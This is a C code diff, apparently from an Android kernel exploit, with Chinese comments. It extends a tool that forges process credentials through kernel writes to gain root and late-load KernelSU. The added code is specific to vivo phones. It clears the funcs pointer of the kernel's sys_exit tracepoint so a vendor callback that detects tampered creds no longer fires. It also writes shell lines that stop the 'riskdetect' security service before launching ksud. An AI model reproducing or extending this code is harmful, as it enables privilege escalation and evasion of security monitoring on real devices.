@@ -129,6 +129,14 @@ struct timer_cfg
     unsigned long long init_groups;        /* init_groups symbol */
     unsigned long long selinux_blob_off;   /* task_security_struct.exec_sid */
     unsigned long long selinux_sid_kernel; /* SECINITSID_KERNEL */
+    /*
+     * vivo 专属（其它机型留空即可，留空就整段跳过）：
+     *   vivo_disarm = 1 且 sys_exit_tp 非 0 时，把 __tracepoint_sys_exit 的
+     *   funcs 指针清零。vivo 在 sys_exit 上挂了回调，检查退出进程的 cred 是否
+     *   刚被改过，不清就会"su 装好了，子进程一跑就消失"。
+     */
+    unsigned long long sys_exit_tp;        /* __tracepoint_sys_exit (static) */
+    unsigned long long vivo_disarm;        /* 1 = zero funcs before ksud */
     char ksu_kmi[64];                      /* KernelSU late-load --kmi */
 };
 static struct timer_cfg g_cfg;
@@ -190,6 +198,8 @@ static void parse_conf_line(char *line)
     else if (!strcmp(key, "init_groups")) g_cfg.init_groups = num;
     else if (!strcmp(key, "selinux_blob_off")) g_cfg.selinux_blob_off = num;
     else if (!strcmp(key, "selinux_sid_kernel")) g_cfg.selinux_sid_kernel = num;
+    else if (!strcmp(key, "sys_exit_tp")) g_cfg.sys_exit_tp = num;
+    else if (!strcmp(key, "vivo_disarm")) g_cfg.vivo_disarm = num;
 }
 
 static int load_conf(const char *path)
@@ -213,6 +223,26 @@ static int load_conf(const char *path)
         return -1;
     }
     return 0;
+}
+
+/*
+ * vivo 机型才做的收尾动作。三重闸门，任何一条不满足都跳过：
+ *   1) 用户在 App 里显式关掉（TIMER_VIVO=0）；
+ *   2) conf 没写 vivo_disarm = 1（其它机型的三份 conf 都没有这一行）；
+ *   3) 没给 sys_exit_tp，或给的地址不像内核地址。
+ * 所以非 vivo 机型跑同一份二进制也不会多发一次写，plant 次数与之前完全一致。
+ */
+static int vivo_disarm_enabled(void)
+{
+    const char *e = getenv("TIMER_VIVO");
+
+    if (e && !strcmp(e, "0"))
+        return 0;
+    if (!g_cfg.vivo_disarm || !g_cfg.sys_exit_tp)
+        return 0;
+    if ((g_cfg.sys_exit_tp & 7) || g_cfg.sys_exit_tp < 0xffffff8000000000ULL)
+        return 0;
+    return 1;
 }
 
 #define CHILD_HELLO 0x52445931
@@ -1264,6 +1294,15 @@ static void write_ksu_script(void)
         return;
     fputs("#!/system/bin/sh\n", f);
     fputs("echo \"[ksu] start uid=$(id -u) selinux=$(getenforce)\"\n", f);
+    /*
+     * vivo：内核侧把 sys_exit 回调表清了，用户态还有 riskdetect 会盯着。
+     * 脚本本身就是 uid=0 在跑，先停掉它，再 late-load。非 vivo 不会进来。
+     */
+    if (vivo_disarm_enabled())
+    {
+        fputs("stop riskdetect 2>/dev/null; setprop ctl.stop riskdetect 2>/dev/null\n", f);
+        fputs("echo \"[ksu] vivo: riskdetect stop attempted\"\n", f);
+    }
     fputs("grep -E '^(Cap|Seccomp)' /proc/self/status\n", f);
     fputs("KSUD=/data/local/tmp/ksud\n", f);
     /* /data/app is 0771 for shell, so find cannot list it; pm knows the exact
@@ -2587,6 +2626,23 @@ int main(int argc, char **argv)
             park_forever("fake uid fix failed");
         logf("[+] fake cred armed: task=%#llx cred=%#llx mode=fake\n",
              g_child_task + g_cfg.task_cred_off, fc.A);
+        /*
+         * vivo：把 __tracepoint_sys_exit 的 funcs 清零。必须赶在 worker exec
+         * ksud 之前做完，否则 root 一出现，ksud / su 退出时就被厂商回调杀掉
+         * （"su 装好了，子进程一跑就消失"）。funcs 在 struct tracepoint 的
+         * +0x48（arm64 + CONFIG_JUMP_LABEL），偏移由 vr.ko 的重定位反推，
+         * 见 KSU-FEASIBILITY.md §九。非 vivo 机型 vivo_disarm_enabled() 为假，
+         * 这里一次写都不会发。
+         */
+        if (vivo_disarm_enabled())
+        {
+            unsigned long long tp = g_cfg.sys_exit_tp + g_slide;
+
+            if (stage_write(tp + 0x48, 0, "vivo_sys_exit", raw, NULL))
+                logf("[!] vivo: sys_exit funcs 清零失败，继续（ksud 可能被回调杀掉）\n");
+            else
+                logf("[+] vivo: __tracepoint_sys_exit(%#llx).funcs = NULL\n", tp);
+        }
     }
     logf("[+] cred writes landed, waking child\n");
 
